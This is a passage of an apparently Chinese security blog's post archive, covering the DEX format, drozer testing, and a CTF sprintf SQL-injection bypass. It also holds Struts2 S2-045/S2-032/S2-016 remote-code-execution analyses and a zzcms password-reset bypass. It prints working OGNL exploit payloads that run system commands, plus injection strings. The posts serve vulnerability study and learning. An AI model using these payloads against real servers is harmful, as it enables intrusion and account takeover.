上面的数据结构28个字节，内容的话看注释也能看懂，我们直接上实例，在这里，classIdx是1，也就是LPino;，第二个accessFlags是1，也就是public，第三个superclassIdx是2，也就是父类是java.lang.Object，第四个interfacesOff是0，就是没有，第五个是sourceFileIdx是7，也就是Pino.java，第六个是annotationOff，是0，没有，第七个classData是22D，也就是DexClassData的偏移是22D，我们先来看看DexClassData的结构体1234567struct DexClassData&#123; DexClassDataHeader header; /*指定字段与方法的个数*/ DexField* staticFields; /*静态字段，DexField结构*/ DexField* instanceFields； /*实例字段，DexField结构*/ DexMethod* directMethods; /*直接方法，DexMethod结构*/ DexMethod* virtualMethods; /*虚方法，DexMethod结构*/&#125; 这里面又涉及到了其他三种结构体1234567891011121314151617struct DexClassDataHeader&#123; u4 staticFieldsSize; /*静态字段个数*/ u4 instanceFieldsSize; /*实例字段个数*/ u4 directMethodsSize; /*直接方法个数*/ u4 virtualMethodsSize; /*虚方法个数*/&#125; struct DexField&#123; u4 fieldIdx; /*指向DexFieldId的索引*/ u4 accessFlags; /*访问标志*/&#125; struct DexMethod&#123; u4 methodIdx; /*指向DexMethodId的索引*/ u4 accessFlags; /*访问标志*/ u4 codeOff; /*指向DexCode结构的偏移*/&#125; 这里需要注意的一点的就是这里的u4并不是值4字节，而是值uleb128的类型，具体是什么可以自行百度。 现在我们再去22D的位置看看从这里可以判断姿态字段0个，实例字段0个，直接方法2个，虚方法0个。因为staticFields和instanceFields都是0个，所以直接从directMethods来看了，methodIdx为0，也就是void Pino.()，accessFlags的值为“81 80 04”，这个是uleb128编码的，转换为16进制的话就是10001h，对照一下DexFile.h文件，知道方法是ACC_PUBLIC和ACC_CONSTRUCTOR表示这个方法是public的并且是构造方法，然后是codeOff的值是“B0 02”，转换为16进制就是130h。第二个函数的methodIdx的值是1，也就是void Pino.main(java.lang.String[])，accessFlags的值是09h，也就是ACC_PUBLIC和ACC_STATIC，codeOff的值是“CB 02”，转换为16进制就是14Bh，也就是位置偏移在14Bh处。]]></content>
      <categories>
        <category>移动安全</category>
      </categories>
      <tags>
        <tag>移动安全</tag>
        <tag>安卓</tag>
        <tag>Dex文件</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Android如何修改classes.dex文件后重新放入apk中]]></title>
    <url>%2F2018%2F07%2F22%2FAndroid%E5%A6%82%E4%BD%95%E4%BF%AE%E6%94%B9classes-dex%E6%96%87%E4%BB%B6%E5%90%8E%E9%87%8D%E6%96%B0%E6%94%BE%E5%85%A5apk%E4%B8%AD%2F</url>
    <content type="text"><![CDATA[提取classes.dex文件 使用安卓逆向助手直接提取classes.dex文件 将apk的后缀名改为zip，然后解压zip压缩包，得到classes.dex文件 修改classes.dex文件 通过IDA PRO进行文件的分析，在IDA View-A标签中鼠标点击需要修改的一行上 选择Hex View-1标签，可以得到需要修改的地方的文件偏移地址 使用winhex打开classes.dex文件，然后快捷键Alt+G，输入上一步获取的偏移，修改机器码为自己想要修改的，保存 classes.dex文件重新校验 使用非虫大大写的Dexfix工具，完成dex修复 classes.dex重新放入apk中 删除原apk中的classes.dex文件 1aapt r source.apk classes.dex 添加修改后的classes.dex到apk中 1aapt a source.apk classes.dex 重新签名apk1signapk.bat source.apk result.apk]]></content>
      <categories>
        <category>移动安全</category>
      </categories>
      <tags>
        <tag>移动安全</tag>
        <tag>安卓</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Dalvik虚拟机与Java虚拟机的区别]]></title>
    <url>%2F2018%2F07%2F19%2FDalvik%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%8EJava%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E5%8C%BA%E5%88%AB%2F</url>
    <content type="text"><![CDATA[Java虚拟机运行的是Java字节码，Dalvik虚拟机运行的是Dalvik字节码传统的Java程序经过编译，生成Java字节码，保存在class文件中，Java虚拟机通过解码class文件中的内容来运行程序。而Dalvik虚拟机运行的是Dalvik字节码，所有的Dalvik字节码由Java字节码转换而来，并被打包到一个DEX可执行文件中，Dalvik虚拟机通过解释DEX文件来执行这些字节码。 Dalvik可执行文件体积更小一般情况下，Java类文件中包含多个不同的方法签名，如果其他的类文件引用该类文件中的方法，那么方法签名也会被复制到其类文件中，那么就会造成多个不同的类会同时包含相同的方法签名，同样的，大量的字符串常量在多个类文件中也被重复使用，这些冗余的信息会直接增加文件的体积，同时也会严重影响虚拟机解析文件的效率。 在Android SDK中有一个叫做dx的工具，它负责将Java字节码转换为Dalvik字节码。dx工具会对Java类文件重新排列，消除在类文件中出现的所有冗余信息，避免虚拟机在初始化时出现反复的文件加载和解析过程。dx工具会将所有的Java类文件中的常量池进行分解，消除其中的冗余信息，重新组合形成一个常量池，所有类文件共享一个常量池。 Java虚拟机与Dalvik虚拟机架构不同Java虚拟机是基于栈架构。程序在运行时虚拟机需要频繁的从栈上读取或者写入数据，这个活动需要更多的指令分配与内存访问次数，会消耗不少CPU时间。 Dalvik虚拟机基于寄存器架构，数据的访问通过寄存器间直接传递，这样的访问方式比基于栈方式要快很多。 Dalvik虚拟机运行时为每个线程维护一个PC计数器与调用栈，这个调用栈维护一份寄存器列表，寄存器的数量在方法结构体的registers字段中给出，Dalvik虚拟机会根据这个值来创建一份虚拟的寄存器列表。]]></content>
      <categories>
        <category>移动安全</category>
      </categories>
      <tags>
        <tag>移动安全</tag>
        <tag>安卓</tag>
        <tag>Dalvik</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[安卓渗透框架drozer使用]]></title>
    <url>%2F2018%2F07%2F09%2F%E5%AE%89%E5%8D%93%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6drozer%E4%BD%BF%E7%94%A8%2F</url>
    <content type="text"><![CDATA[获取安卓设备上的所有安卓的app信息12run app.package.listrun app.package.list -f [关键字] 获取sieve的一些基本信息1run app.package.info -a com.mwr.example.sieve 确定攻击面1run app.package.attacksurface com.mwr.example.sieve exported表示组件可以被其他app利用services is debugged 表示我们可以用adb绑定一个调试器到进程 获取activity组件信息1run app.activity.info -a com. 启动activity组件（测试越权）1run app.activity.start —component com.mwr.example.sieve com.mwr.example.sieve.PWList 获取contentprovider组件信息1run app.provider.info -a 查找可以访问content provider的URI（数据泄露）1run scanner.provider.finduris -a com. 从content url中获取数据1run app.provider.query content://com.mwr —vertical 进行sql注入12run app.provider.query content://com. —-projection [select &lt;projection&gt; from xxxx]run app.provider.query content://com. —selection [where &lt;condition&gt;] 读取文件1run app.provider.read 下载文件1run app.provider.download 检测sql注入1run scanner.provider.injection -a com. 检测文件遍历1run scanner.provider.traversal -a com. 获取service组件信息1run app.service.info -a com. 向某个服务发送信息1run app.service.send com.mwr.example.sieve com.mwr.example.sieve.CryptoService —msg 获取broadcast组件信息1run app.broadcast.info -a com.]]></content>
      <categories>
        <category>移动安全</category>
      </categories>
      <tags>
        <tag>移动安全</tag>
        <tag>安卓</tag>
        <tag>drozer</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[安卓四大组件]]></title>
    <url>%2F2018%2F07%2F09%2F%E5%AE%89%E5%8D%93%E5%9B%9B%E5%A4%A7%E7%BB%84%E4%BB%B6%2F</url>
    <content type="text"><![CDATA[Activity对于程序中的每一个界面都是一个Activity， 每一个Activity有不同的功能，比如登录、注册、 注册码验证、手势密码等，Activity之间的切换需 要满足一定的条件。 ContentProviderContentProvider用于保存和获取数据，并使其对所有应用程序可见。 这是不同应用程序间共享数据的唯一方式，因为android没有提供所有应用共同访问的公共存储区。比如通讯录数据。 ServiceService服务是伴随着程序启动，一直运行在后台，主要起检测作用的执行代码。服务一般用于时刻检测客户端的更新状态、时刻检测是否异地登录、时刻上传用户的操作信息 Broadcast广播是当程序检测到外界的某种运行环境发生变化时，而执行的逻辑代码，比如程序的自启、网络变化变化、实时消息(打车软件)。]]></content>
      <categories>
        <category>移动安全</category>
      </categories>
      <tags>
        <tag>移动安全</tag>
        <tag>安卓</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[由一次CTF引发的学习笔记之PHP的sprintf函数]]></title>
    <url>%2F2018%2F06%2F19%2F%E7%94%B1%E4%B8%80%E6%AC%A1CTF%E5%BC%95%E5%8F%91%E7%9A%84%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8BPHP%E7%9A%84sprintf%E5%87%BD%E6%95%B0%2F</url>
    <content type="text"><![CDATA[0x01 前言周末打了一次LCTF，感觉这次题目出的好难，其中做了Simple blog题的时候，发现了一个神奇的知识点：用php的sprintf函数来绕过mysql_real_escape_string()函数进行sql注入。 PS.在写这篇文章的时候发现都php源码的重要性，在看seebug的文章的时候，发现其对sprintf的$符号的用法一笔带过，对于初学者来说根本无法理解这个符号在sprintf中的作用，幸亏那篇文章有php源码的链接，自己看了看才懂得$符号究竟的用来干什么的，感叹一下果然文档不是万能的，自己读源码才是王道啊。 0x02 赛题复现这道题最先是一个padding oracle，写脚本跑出来token后就可以进入admin.php了，这里给一下admin.php的代码12345678910111213141516171819202122232425262728&lt;?phperror_reporting(0);session_start();include(&apos;config.php&apos;);if(!$_SESSION[&apos;isadmin&apos;])&#123; die(&apos;You are not admin&apos;);&#125;if(isset($_GET[&apos;id&apos;]))&#123; $id = mysql_real_escape_string($_GET[&apos;id&apos;]); if(isset($_GET[&apos;title&apos;]))&#123; $title = mysql_real_escape_string($_GET[&apos;title&apos;]); $title = sprintf(&quot;AND title=&apos;%s&apos;&quot;, $title); &#125;else&#123; $title = &apos;&apos;; &#125; $sql = sprintf(&quot;SELECT * FROM article WHERE id=&apos;%s&apos; $title&quot;, $id); $result = mysql_query($sql,$con); $row = mysql_fetch_array($result); if(isset($row[&apos;title&apos;])&amp;&amp;isset($row[&apos;content&apos;]))&#123; echo &quot;&lt;h1&gt;&quot;.$row[&apos;title&apos;].&quot;&lt;/h1&gt;&lt;br&gt;&quot;.$row[&apos;content&apos;]; die(); &#125;else&#123; die(&quot;This article does not exist.&quot;); &#125;&#125;?&gt; 通过之前得到的token可以绕过第一个if判断，然后往下看推测是一个注入。这里id和title两个参数是我们可控的，但是都用了mysql_real_escape_string()进行转移了，先来看一下mysql_real_escape_string()的功能 因此，正常情况下想要注入的话几乎是不可能的。但是，这里有个奇特之处在于使用了两个sprintf函数进行拼接，并且第一个sprintf后的结果拼接到了第二个sprintf里面。这里利用了sprintf的一个小特性可以逃逸单引号，具体原理之后说，我们先来看看结果如何 可以看到当and 1=1的时候返回正常，当and 1=2的时候返回错误，因此可以注入！ 0x03 漏洞原理这里我们利用了sprintf的一个padding功能，是的单引号被吃掉了，可以看到php文档中有一个例子如下： 这里的用法就是在格式化字符串中，单引号后面的字符代表着用该字符去进行填充，那么如果能够提前输入1%&apos; and 1=1# 如果存在addslashes或者mysql_real_escape_string等之类的过滤，把单引号进行了转义，变成\’，那么其中的反斜杠会被sprintf认为是填充的字符，从而吃掉了反斜杠，达到单引号逃逸的目的。 但是在这道题中，如果用1%&apos; and 1=1# 这个的话还是不好用，因为这种方式容易遇到PHP Warning: sprintf(): Too few arguments的报错。 因此还需要sprintf的另一个trick。 如上图，文档中还有一个例子，其中%后面的数字代表着第几个参数，$符号在这里的作用是中止符，用来检测前面有几个数字的，而$符号后面的字母代表着参数类型，s表示stirng类型，因此可以构造1%1$&apos;%s&apos; 这里的意思就是，第一个参数，用%进行填充，类型为stirng，那么最后刚好剩余了一个单引号，成功逃逸！因此，第一个id参数就要输入正常的，在title参数时输入%1$’%即可。在这道题里就是12id=3title=This is admin page%1$&apos; and 1=1# ok，成功！ 0x04 参考https://paper.seebug.org/386/https://github.com/php/php-src/blob/c8aa6f3a9a3d2c114d0c5e0c9fdd0a465dbb54a5/ext/standard/formatted_print.c]]></content>
      <categories>
        <category>PHP安全</category>
      </categories>
      <tags>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[S2-045远程代码执行漏洞分析]]></title>
    <url>%2F2018%2F06%2F19%2FS2-045%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[0x01 前言最近在学习java安全，第一个目标就是Struts了，准备找一些比较典型的Struts漏洞进行一系列的分析。 0x02 漏洞分析 首先看下官方文档的描述 发现是在Content-Type处写入恶意的代码来进行代码执行的，然后选择下载Struts 2.3.31和Struts 2.3.32两个版本进行对比研究 丢进Beyond Compare中看一看发现dispatcher.multipart包中的三个java文件有不同，我们可以看到Jakarta字样，Jakarta是Struts2默认的上传处理配置，因此我们可以知道应该是要模拟上传行为来触发漏洞。 点开这三个java文件，我们可以发现其实修复的处理都是一样的 总结一下就是把1LocalizedTextUtil.findText(this.getClass(), errorKey, defaultLocale, e.getMessage(), args); 这里的e.getMessage()换成了null，所以我们推测应该是报错信息出现的问题把。我们直接本地搭建一个上传点，然后开burp拦截，启动debug模式，在上面的地方下断点，进行调试看看，因为需要报错信息才能触发漏洞，所以我就直接在Content-Type处直接加了个123，解析肯定会报错的 这里有一个小技巧就是我们把这个上传包send to repeat一下，这样之后重新调试的时候直接go一下就可以了，不用每次都抓包，很麻烦。 然后我们Go一下，程序会停在断点处 然后我们单步进入 发现之前findText处的e.getMessage()处变成了defaultMessage，并且看一下监视器，发现这个变量前面是固定报错信息，但是后面拼接了我们出入的Content-Type字段的数据。 这个时候还不明朗，继续往下走，进入findText函数内部 其实这里我发现一点，那就是官方文档中已经说明了findText方法的作用，大致意思就是：如果Content-Type解析错误了，那么他就要找到指定的aTextName变量的本地化消息，如果在aClass变量指定的包中没有找到，就继续在上一个包中找，一直循环，直到obj包。并且有一点就是，官方文档明确说明了错误信息会被当作ognl表达式在解析 先记着吧，我们继续往下看。 往下走发现有一个findMessage函数，进去看看 发现就是并没有什么用，都是返回的null 之后到了下面有一个循环这个循环就是之前说的那个在aClass变量执行的包中找，如果找不到就在上一个包中找，发现他会一直到obj包中都还没有找到 继续走，发现了一个敏感函数，getDefaultMessage。因为我们之前是直到的，defaultMessage变量是我们可控的，进去看一下 找的了！之前分析S2-016的时候我们直到在translateVariables函数中是可以执行ognl表达式的，看一下这里的message参数， 刚好是我们们出入的defaultMessage，可控！ 继续进入后，看到 那么payload的写法还是%{}或者${} 最后进入到执行ognl表达式的函数中就会发现他是只执行${xxx}或者%{xxx}中的xxx的，所以并不用担心defaultMessage中系统自带的那些报错信息 0x03 exp编写回溯buildErrorMessage函数,发现其在parse函数执行回溯parse函数，发现其在MultiPartRequestWrapper函数中执行回溯MultiPartRequestWrapper函数，发现其在dispatcher.wrapRequest函数中执行但是我们发现，在获取Content-Type之后，有一个if判断，就是说Content-Type中必须得有multipart/form-data，才会执行之后的函数，所以编写exp的时候必须要有multipart/form-data字符串才行。 再回溯到了PrepareOperations.wrapRequest再回溯到了StrutsPrepareAndExecuteFilter.doFilter 1%&#123;(#nike=&apos;multipart/form-data&apos;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&apos;com.opensymphony.xwork2.ActionContext.container&apos;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&apos;whoami&apos;).(#iswin=(@java.lang.System@getProperty(&apos;os.name&apos;).toLowerCase().contains(&apos;win&apos;))).(#cmds=(#iswin?&#123;&apos;cmd.exe&apos;,&apos;/c&apos;,#cmd&#125;:&#123;&apos;/bin/bash&apos;,&apos;-c&apos;,#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125; 0x04 总结 Jarkata解析器是默认的文件上传解析器 core包中的struts-default.xml中存在类成员访问的黑名单功能]]></content>
      <categories>
        <category>漏洞分析与复现</category>
      </categories>
      <tags>
        <tag>漏洞分析</tag>
        <tag>Struts2</tag>
        <tag>远程代码执行</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[S2-032远程代码执行漏洞分析]]></title>
    <url>%2F2018%2F06%2F19%2FS2-032%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[0x01 前言最近在学习java安全，第一个目标就是Struts了，准备找一些比较典型的Struts漏洞进行一系列的分析。 0x02 漏洞分析 首先，看一下官方文档 看了一下发现是由于动态方法调用（DMI）所引起的远程代码执行，下载Struts 2.3.28和Struts 2.3.28.1进行代码分析 使用Beyond Compare比较一下两个版本的区别 排查了一下，发现在DefaultActionMapper.java中（又是这个。。） 进入代码，发现在对传入的方法名称的时候使用了cleanActionName方法进行过滤了 这个cleanActionName方法是新写的，主要是 如果方法名称不再这个pattern范围内，就不行。 既然这里存在问题，那么我就在此处下个断点，看看整个流程是如何的。 在运行代码之前，要在struts.xml中加一句 这个用来把动态方法调用开启。 看了一下DefaultActionMapper类的声明 跟之前S2-016的用法比较类似，使用?method:execute的方式调用execute方法（execute方法是struts2中默认的action调用方法，这里我本地搭建环境，为了方便就是用execute方法了） 开始访问url程序在断点处停止了，然后一直跟进当进入Dispatcher类中的serviceAction方法中的选择单步跳入 一直选择单步跳入，跳到 这里的话算对了。（对了就不要停！继续跟进！） 跳到DefaultActionProxy类中的DefaultActionProxy方法中，我们可以看到这个我们传入的方法被带入到escapeHtml4进行处理 在监视器中可以看到methodName确实是我们传入的execute 这里会进行html编码、转义操作。 之后就一直单步跳出，一直跟踪到Dispatcher类的proxy.exeute()的时候再单步进入 然后在invocation.invoke()处再次单步步入 之后看到我们有一个invocation.invoke()，这个是用来执行struts2的拦截器的，在这里步入 在这里有一处：1resultCode = interceptor.getInterceptor().intercept(DefaultActionInvocation.this); 此处是递归执行拦截器方法，会在这里执行多次，多点几下，然后到达下面的invokeActionOnly，进入 多次步入之后就会进入DefaultActionInvoke类中的invokeAction方法中，有一个ognlUtil.getValue方法，此处会将method的名字，也就是我们传入的，可控的传入进去，当做ognl表达式来执行。 这样我们就知道了在method:后面加上我们要执行的ognl表达式即可执行任意代码了。 0x03 exp编写1%23_memberAccess%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%2C%23res%3D%40org.apache.struts2.ServletActionContext%40getResponse()%2C%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D)%2C%23w%3D%23res.getWriter()%2C%23a%3Dnew%20java.util.Scanner(%40java.lang.Runtime%40getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.d%5B0%5D)%2C%23str%3D%23a.hasNext()%3F%23a.next()%3A%23parameters.dd%5B0%5D%2C%23w.print(%23str)%2C%23w.close()%2C%23request.toString&amp;cmd=ls&amp;dd= &amp;d=____A&amp;encoding=UTF-8 这里需要注意的是之前我们分析的时候发现我们传入的参数会被html编码以及转义的操作，因此我们写payload的时候不能出现双引号或者单引号等等，因此这里用#parameters.cmd[0]来获取命令，并且使用`@org.apache.struts2.ServletActionContext@getResponse()`来获取response对象 0x04 总结 DefaultActionInvocation类中的intercept方法是用来执行拦截器的 Struts2的拦截器是递归调用的 拦截器中的代码执行顺序，在执行Action之前，与堆栈执行顺序一致；而在Action和Result之后，则是逆序执行 Action层面的四个方面分别是：拦截器、Action、PreResultListener、Result 在DefaultActionInvocation中的invokeAction，存在ognlUtil.getValue方法，可以执行ognl表达式 ognl获取response对象的方法： @ org.apache.struts2.ServletActionContext@getResponse() #context.get(&#39;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#39;) #parameters.cmd[0]等价与request.getParameter(&#39;cmd&#39;)]]></content>
      <categories>
        <category>漏洞分析与复现</category>
      </categories>
      <tags>
        <tag>漏洞分析</tag>
        <tag>Struts2</tag>
        <tag>远程代码执行</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[S2-016远程代码执行漏洞分析]]></title>
    <url>%2F2018%2F06%2F19%2FS2-016%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[0x01 前言最近在学习java安全，第一个目标就是Struts了，准备找一些比较典型的Struts漏洞进行一系列的分析。 0x02 漏洞分析 首先到Struts2的官方文档中找一下S2-016漏洞的文档 看文档主要是找到该漏洞的版本，由图可知，该漏洞发生在Struts2.0.0 - Struts2.3.15，并且在Struts 2.3.15.1中得到修复，那么我们就将Struts 2.3.15和Struts 2.3.15.3两个版本的源码下载下载 使用Beyond Compare工具进行对比，注意要把比较时间戳的选项去掉找了半天发现就一处不一样/core/src/main/java/org/apache/struts2/dispatcher/mapper/DefaultActionMapper.java 通过对比，发现 REDIRECT_PREFIX、REDIRECT_ACTION_PREFIX被删掉了 同时他们配套的put方法也被删掉了 还有一个就是action对应的put方法中添加了一个cleanActionName方法 看了一下官方文档给的poc 我选择在redirect配套的put方法中加断点，看看情况是如何的。在这里，有一个匿名类的用法，同时声明并执行了一个execute函数，看一下监视器中的变量发现这里传入的key是1redirect:%&#123;3*4&#125; 也就是我传入的参数，那么这部分就是用户可控的地方。继续往下走setLocation方法就是这是重定向的值，最后把用户输入的重定向的值设置为result，result的一般在struts.xml中可以用标签来设置的，这里是用1?redirect:xxx 来设置的。继续往下走，发现跳出了put方法发现到了DefaultActionMapper类中的handleSpecialParameters函数中（这里可以记下来，如果后续没有思路的话可以回溯往上再找找看），此处我选择继续往下跟进。多次step over和step into之后，发现跳到了StrutsPreparedAndExecuteFilter类的doFilter函数中，这个是Struts2的核心过滤器，每个请求都会到达这个类的这个函数中。step into execute.executeAction中看一下，其中该方法的参数，request和response没什么好说的，mapping是请求的参数，包括redierect的location、Action的名称、namespace等等，继续跟进发现进入Dispatcher类中 其中有一个result.execute，进去看看 发现进入了ServletRedirectResult类的execute方法，其中还要进入他的父类ServletResultSupport的execute方法继续跟进到conditionalParse方法中进入到了StrutsResultSupport类中的conditionalParse方法，其中我们看到了translateVariables方法，这个方法其实就是一个可以执行ognl表达式的方法，继续分析一下getStack()方法返回的就是OgnlValueStack，而param是%{3*4}刚好是我们输入的参数，满足参数可控，继续跟进进入到了TextParseUtil类中，我们看到第一个参数是1new char[]&#123;&apos;$&apos;,&apos;%&apos;&#125; 也就是说我们输入%{xxxx}或者${xxx}都可以执行之后我们进入translateVariables方法中 执行到parser.evaluate的时候跟进入，函数源码如下：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374public Object evaluate(char[] openChars, String expression, TextParseUtil.ParsedValueEvaluator evaluator, int maxLoopCount) &#123; // deal with the &quot;pure&quot; expressions first! //expression = expression.trim(); Object result = expression; int pos = 0; for (char open : openChars) &#123; int loopCount = 1; //this creates an implicit StringBuffer and shouldn&apos;t be used in the inner loop final String lookupChars = open + &quot;&#123;&quot;; while (true) &#123; int start = expression.indexOf(lookupChars, pos); if (start == -1) &#123; loopCount++; start = expression.indexOf(lookupChars); &#125; if (loopCount &gt; maxLoopCount) &#123; // translateVariables prevent infinite loop / expression recursive evaluation break; &#125; int length = expression.length(); int x = start + 2; int end; char c; int count = 1; //检查表达式中的格式是否是%&#123;&#125;或者$&#123;&#125;，‘&#123;’或者‘&#125;’不能多也不能少 while (start != -1 &amp;&amp; x &lt; length &amp;&amp; count != 0) &#123; c = expression.charAt(x++); if (c == &apos;&#123;&apos;) &#123; count++; &#125; else if (c == &apos;&#125;&apos;) &#123; count--; &#125; &#125; end = x - 1; if ((start != -1) &amp;&amp; (end != -1) &amp;&amp; (count == 0)) &#123; String var = expression.substring(start + 2, end); //获取大括号中的内容 Object o = evaluator.evaluate(var);//执行了ognl表达式，返回结果 String left = expression.substring(0, start); String right = expression.substring(end + 1); String middle = null; if (o != null) &#123; middle = o.toString(); if (StringUtils.isEmpty(left)) &#123; result = o; &#125; else &#123; result = left.concat(middle); &#125; if (StringUtils.isNotEmpty(right)) &#123; result = result.toString().concat(right); &#125; expression = left.concat(middle).concat(right); &#125; else &#123; // the variable doesn&apos;t exist, so don&apos;t display anything expression = left.concat(right); result = expression; &#125; pos = (left != null &amp;&amp; left.length() &gt; 0 ? left.length() - 1: 0) + (middle != null &amp;&amp; middle.length() &gt; 0 ? middle.length() - 1: 0) + 1; pos = Math.max(pos, 1); &#125; else &#123; break; &#125; &#125; &#125; return result; &#125; 当执行到这里，再次进入 一路跟进，发现最后由Ognl类的getValue执行了ognl表达式 得到了结果12 0x03 exp编写1$&#123;#a=new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;netstat&quot;,&quot;-an&quot;&#125;).start().getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[51020],#c.read(#d),#screen=#context.get(&apos;com.opensymphony.xwork2.dispatcher.HttpServletResponse&apos;).getWriter(),#screen.println(#d),#screen.close()&#125; 注意要进行url编码 0x04 总结 translateVariable能够执行ognl表达式 org.apache.struts2.dispatcher.StrutsResultSupport类中的conditionalParse能够解析ognl表达式 所有的请求会到StrutsPreparedAndExecute类的doFilter中 exp中使用#content.get(‘com.opensymphony.xwork2.dispatcher.HttpServletResponse’).getWriter().printnln()来回显]]></content>
      <categories>
        <category>漏洞分析与复现</category>
      </categories>
      <tags>
        <tag>漏洞分析</tag>
        <tag>Struts2</tag>
        <tag>远程代码执行</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CVE-2017-16995 Ubuntu本地提权]]></title>
    <url>%2F2018%2F06%2F19%2FCVE-2017-16995Ubuntu%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%2F</url>
    <content type="text"><![CDATA[0x01 漏洞信息几天前，圈子里疯传了ubuntu的本地提权，其主要是在twitter中用户用户 @Vitaly Nikolenko发布消息,并且还给了exp下载。 从上图可以看到，首先我们要下载之前的.c文件，然后使用gcc进行编译，然后用普通用户执行，即可提权。 受影响范围： Linux Kernel Version 4.14-4.4仅影响Ubuntu/Debian发行版本 0x02 防御措施 2.1 第一种方法在终端执行以下命令进行升级内核 1echo &quot;deb http://archive.ubuntu.com/ubuntu/xenial-proposed restricted main multiverse universe&quot; &gt; /etc/apt/sources.list &amp;&amp; apt update &amp;&amp; apt install linux-image-4.4.0-117-generic 2.2 第二种方法执行以下命令关闭bpf服务 1echo 1 &gt; /proc/sys/kernel/unprivileged_bpf_disabled]]></content>
      <categories>
        <category>漏洞分析与复现</category>
      </categories>
      <tags>
        <tag>Ubuntu</tag>
        <tag>提权</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[zzcms v8.2 任意用户密码重置]]></title>
    <url>%2F2018%2F06%2F19%2Fzzcms8-2%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE%2F</url>
    <content type="text"><![CDATA[0x01 漏洞概述本次zzcms8.2的漏洞是任意用户密码重置，需要事先注册一个账号用来做测试，同时在找回密码的地方也存在遍历用户的问题，那么就开始复现漏洞了。 0x02 漏洞复现首先，我注册了一个test／test用户，然后点击登录的忘记密码，即http://127.0.0.1/one/getpassword.php 通过这种方式，如果有一个强大的字典，即可遍历很多用户名了。 填写好了正确的用户名和验证码之后，进入第二步，按照正常流程，点击发送验证码，然后随便填写一个验证码，抓包后send repeat后进行go，然后看到相应包的结果，如图 我们可以看到在响应包中有一段js代码1window.document.userreg.yzm_mobile2.value=&apos;no&apos; 将其中的no改为yes，即1window.document.userreg.yzm_mobile2.value=&apos;yes&apos; 然后重新来一次，在第二步的时候，点击下一步之前在浏览器的console控制器中将修改后的js复制过去并执行 再次抓包 会发现这个之前没有的包，然后发现浏览器界面已经跳转到了第三步重置密码的界面了。 0x03 漏洞分析本次zzcms的任意密码重置漏洞网上有很多复现，但是都没有产生原因的分析，因此我通过抓包分析了出现的PHP文件后发现漏洞出现在ajax/ajax/yzm_check_ajax.php中 截图部分是所有的php代码，这里id的值就是输入的验证码，founderr用来判断验证码是否正确，如果等于1的话就是说验证码是错误的，如果是正确的话就会echo三个标签，仔细看的话这这个是我们之前在响应包中看到的那个带有no的js代码，而如果是正确的验证码的话就是yes，因此，这里应该是通过前端的代码来最终判断验证码是否正确，但是开发者却忽视了前端代码是我们可以控制的，因此可以绕过这里的验证码。]]></content>
      <categories>
        <category>漏洞分析与复现</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
        <tag>漏洞分析</tag>
        <tag>ZZCMS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Redis未授权访问漏洞]]></title>
    <url>%2F2018%2F06%2F19%2FRedis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%2F</url>
